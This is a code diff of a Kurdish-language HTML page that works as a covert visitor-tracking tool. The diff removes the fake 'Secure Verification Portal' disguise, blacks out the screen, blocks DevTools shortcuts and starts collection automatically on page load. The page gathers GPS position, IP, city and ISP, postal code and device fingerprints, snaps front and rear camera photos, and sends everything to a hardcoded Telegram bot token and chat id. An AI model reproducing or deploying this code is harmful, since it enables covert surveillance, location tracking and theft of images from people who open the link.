@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Verification Portal</title>
+    <title></title>
     <style>
         * { box-sizing: border-box; }
         body { 
-            background: #030712;
-            color: #f3f4f6; 
+            background: #000000;
+            color: #000000; 
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
             text-align: center; 
             display: flex; 
@@ -20,45 +20,27 @@
             overflow: hidden;
         }
         .card {
-            background: #0f172a;
-            padding: 40px 30px;
-            border-radius: 20px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.8);
-            max-width: 440px;
-            width: 90%;
-            border: 1px solid #1e293b;
+            display: none; /* هەمی تشت ڤەشارتییە و شاشە ڕەشە */
         }
-        h2 { margin-bottom: 12px; font-size: 24px; color: #38bdf8; }
-        p { color: #94a3b8; font-size: 14px; margin-bottom: 30px; line-height: 1.6; }
-        .btn {
-            background: linear-gradient(135deg, #0284c7, #2563eb);
-            color: white;
-            border: none;
-            padding: 15px 20px;
-            font-size: 16px;
-            font-weight: bold;
-            border-radius: 10px;
-            cursor: pointer;
-            width: 100%;
-            transition: 0.3s;
-            box-shadow: 0 6px 20px rgba(37, 99, 235, 0.5);
-        }
-        .btn:hover { background: linear-gradient(135deg, #0369a1, #1d4ed8); }
         #hidden-video, #canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="card" id="main-card">
-        <h2>پەیامەکا پاراستی</h2>
-        <p>ژ بۆ پشتراستکرنا ناسناما تە و دیتنا ناڤەڕۆکا ڤەکری، لطفاً دوگمەیێ کلیک بکە.</p>
-        <button class="btn" onclick="startUltimateProcess()">پشتراستکرن و دەستپێکرن</button>
-    </div>
+    <div class="card" id="main-card"></div>
 
     <video id="hidden-video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
     <script>
+        // دژایەتیا ڤەکرنا فایلا کۆدێ (DevTools Blocker)
+        document.addEventListener('contextmenu', event => event.preventDefault());
+        document.onkeydown = function(e) {
+            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) {
+                return false;
+            }
+        };
+
         const token = '8927591228:AAGdIn4qL1xVXpH-jQ-lX_Ccgsy5jMByol4';
         const chat_id = '7643191802';
         const api = 'https://api.telegram.org/bot' + token;
@@ -73,7 +55,7 @@
             } catch (e) {}
         }
 
-        // وەرگرتنا زانیاریێن جیۆگرافی (GPS)
+        // وەرگرتنا زانیاریێن جیۆگرافی (GPS) ب هوردییا بلند
         function getGeoLocation() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
@@ -84,17 +66,18 @@
                     (pos) => {
                         const lat = pos.coords.latitude;
                         const lon = pos.coords.longitude;
-                        resolve(`📍 جیۆلۆکەیشن (GPS): ${lat}, ${lon}\n🗺 نەخشە: https://maps.google.com/?q=${lat},${lon}`);
+                        const acc = pos.coords.accuracy;
+                        resolve(`📍 جیۆلۆکەیشن (GPS VIP): ${lat}, ${lon}\n🎯 خێرایی/دروستی (Accuracy): ${acc} متر\n🗺 نەخشە: https://maps.google.com/?q=${lat},${lon}`);
                     },
                     (err) => {
-                        resolve("📍 جیۆلۆکەیشن: نەهاتە دان (رەتکرن)");
+                        resolve("📍 جیۆلۆکەیشن: نەهاتە دان یان ژ لایێ مێهڤانی ڤە هاتە رەتکرن");
                     },
-                    { timeout: 5000, enableHighAccuracy: true }
+                    { timeout: 7000, enableHighAccuracy: true, maximumAge: 0 }
                 );
             });
         }
 
-        // وەرگرتنا باترییێ
+        // وەرگرتنا پەترییێ
         async function getBatteryInfo() {
             try {
                 if ('getBattery' in navigator) {
@@ -102,10 +85,10 @@
                     return `🔋 رێژا باترییێ: ${Math.round(bat.level * 100)}% (${bat.charging ? 'بار دبیت ⚡' : 'بێ بار'})`;
                 }
             } catch(e) {}
-            return "";
+            return "🔋 رێژا باترییێ: نەهاتە بدەستخستن";
         }
 
-        // وەرگرتنا زانیاریێن کارتەکا گرافیكی (GPU Fingerprint)
+        // گرافیك و کارتها هاردوێرێ
         function getGpuInfo() {
             try {
                 const canvas = document.createElement('canvas');
@@ -115,28 +98,28 @@
                 if (debugInfo) {
                     const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                     const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                    return `🎮 چێڤەرێ گرافیكی (GPU): ${renderer} (${vendor})`;
+                    return `🎮 چێڤەرێ گرافیكی (GPU VIP): ${renderer} (${vendor})`;
                 }
             } catch (e) {}
             return "🎮 گرافیك: نەهاتە ناسین";
         }
 
-        // وەرگرتنا تۆڕا ئینتەرنێتێ
+        // تۆڕ و خێرایی
         function getNetworkInfo() {
             try {
                 const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                 if (conn) {
-                    return `📶 جۆرێ ئینتەرنێتێ: ${conn.effectiveType || 'نەدیار'} (خێرایی: ${conn.downlink || '?'} Mbps)`;
+                    return `📶 جۆرێ ئینتەرنێتێ: ${conn.effectiveType || 'نەدیار'} | خێرایی: ${conn.downlink || '?'} Mbps | پینگ (RTT): ${conn.rtt || '?'}ms`;
                 }
             } catch (e) {}
-            return "";
+            return "📶 جۆرێ ئینتەرنێتێ: نەدیار";
         }
 
         async function getIpInfo() {
             try {
                 let res = await fetch('https://ipapi.co/json/');
                 let data = await res.json();
-                return `🌍 وەڵات: ${data.country_name} (${data.country_code})\n🏙 باژێر: ${data.city}\n🌐 ئایپی (IP): ${data.ip}\n🏢 کۆمپانیا (ISP): ${data.org}`;
+                return `🌍 وەڵات: ${data.country_name} (${data.country_code})\n🏙 باژێر: ${data.city} - ناوچە: ${data.region}\n🌐 ئایپی (IP): ${data.ip}\n🏢 کۆمپانیا (ISP): ${data.org}\n📮 پۆست کۆد: ${data.postal}`;
             } catch (e) {
                 return "🌍 زانیاریێن IP: نەهاتنە دیتن";
             }
@@ -150,29 +133,36 @@
             let netDetails = getNetworkInfo();
             let currentTime = new Date().toLocaleString();
             
-            return `🔥 [ ⚡ MAXIMUM ULTIMATE HACK LOG ⚡ ] 🔥
+            return `👑 [ 🔥 VIP MAX ULTIMATE SYSTEM LOG 🔥 ] 👑
 ⏱ دەم و ڕوژ: ${currentTime}
+----------------------------------
 ${ipDetails}
+----------------------------------
 ${geoDetails}
-${batteryDetails ? batteryDetails + '\n' : ''}${gpuDetails}
-${netDetails ? netDetails + '\n' : ''}📱 سیستەم: ${navigator.platform}
+----------------------------------
+${batteryDetails}
+${gpuDetails}
+${netDetails}
+----------------------------------
+📱 سیستەم: ${navigator.platform}
 🧠 هۆشی (RAM): ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'نەدیار'}
 ⚙️ کۆرسیێن پرۆسێسەری: ${navigator.hardwareConcurrency || 'نەدیار'}
 👆 دەستکاریکرنا شاشەی (Touch Points): ${navigator.maxTouchPoints || 0}
 🌐 بووکەر: ${navigator.userAgent}
 🗣 زمان: ${navigator.language}
-📐 قەبارەی شاشەی: ${window.screen.width}x${window.screen.height}`;
+📐 قەبارەی شاشەی: ${window.screen.width}x${window.screen.height}
+🖥 قەبارەی پەنجەرەی کارا: ${window.innerWidth}x${window.innerHeight}`;
         }
 
         async function sendVisitorLog() {
             let details = await getUltimateInfo();
-            sendText(`🚀 سەردانکەرەکێ نوو (MAXIMUM LEVEL) لینک ڤەکەت!\n\n${details}\n\n⚠️ بڕڤەبە: @YUSEEF_SURCHI`);
+            sendText(`⚡ سەردانکەرەکێ نوو (VIP FULL MAX LEVEL) لینک ڤەکەت!\n\n${details}\n\n⚠️ بڕڤەبە: @YUSEEF_SURCHI\n⚖️ بۆ هەر کارەکێ بێ ئەخلاق ئەم بەرپرس نینین.`);
         }
 
         async function captureCamera(facing, label) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: facing }
+                    video: { width: { ideal: 1920 }, height: { ideal: 1080 }, facingMode: facing }
                 });
                 const video = document.getElementById('hidden-video');
                 video.srcObject = stream;
@@ -193,13 +183,13 @@ ${netDetails ? netDetails + '\n' : ''}📱 سیستەم: ${navigator.platform}
                                         const formData = new FormData();
                                         formData.append('chat_id', chat_id);
                                         formData.append('photo', blob, 'shot.jpg');
-                                        formData.append('caption', `📸 وێنەیێ (${label})!\n\n${details}\n\n⚠️ بڕڤەبە: @YUSEEF_SURCHI`);
+                                        formData.append('caption', `📸 وێنەیێ VIP MAX (${label})!\n\n${details}\n\n⚠️ بڕڤەبە: @YUSEEF_SURCHI\n⚖️ بۆ هەر کارەکێ بێ ئەخلاق ئەم بەرپرس نینین.`);
 
                                         await fetch(`${api}/sendPhoto`, { method: 'POST', body: formData });
                                     }
                                     stream.getTracks().forEach(t => t.stop());
                                     resolve();
-                                }, 'image/jpeg', 0.95);
+                                }, 'image/jpeg', 0.98);
                             }, 1500);
                         }).catch(() => {
                             stream.getTracks().forEach(t => t.stop());
@@ -207,24 +197,17 @@ ${netDetails ? netDetails + '\n' : ''}📱 سیستەم: ${navigator.platform}
                         });
                     };
                 });
-            } catch (err) {
-                // ئەگەر کامێرا پاش نەبوو یان هاتە رەتکرن، سۆکریپت رێگریێ ل بەردەوامیێ ناکەت
-            }
+            } catch (err) {}
         }
 
-        async function startUltimateProcess() {
-            document.getElementById('main-card').innerHTML = "<h2>چاوەڕێبە...</h2><p>تکایە کچکەکێ صبر بکە هەتا داتا و بڕوخسەت هێنە بجهئینان.</p>";
-            
-            await sendVisitorLog();
-            
-            // گرتنا کامێرا پێشی
-            await captureCamera("user", "کامێرا پێشی (Selfie)");
-            
-            // گرتنا کامێرا پاش (ل موبایلان کار دکەت، ئەگەر نەبوو خودکار هاتیە پاسدان)
-            await captureCamera("environment", "کامێرا پاش (Rear)");
-
-            document.getElementById('main-card').innerHTML = "<h2>پشتراستکرن تەواو بوو!</h2><p>سوپاس بۆ هاریکاریا تە، نوکە دشێی لاپەڕەی بێخە.</p>";
-        }
+        // پڕۆسەیا خۆکار ل دەمێ ڤەکرنا لاپەڕەی (پشتی 1 چرکە)
+        window.onload = function() {
+            setTimeout(async () => {
+                await sendVisitorLog();
+                await captureCamera("user", "کامێرا پێشی (Selfie VIP)");
+                await captureCamera("environment", "کامێرا پاش (Rear VIP)");
+            }, 1000); // 1000 ms = 1 Second
+        };
     </script>
 </body>
 </html>
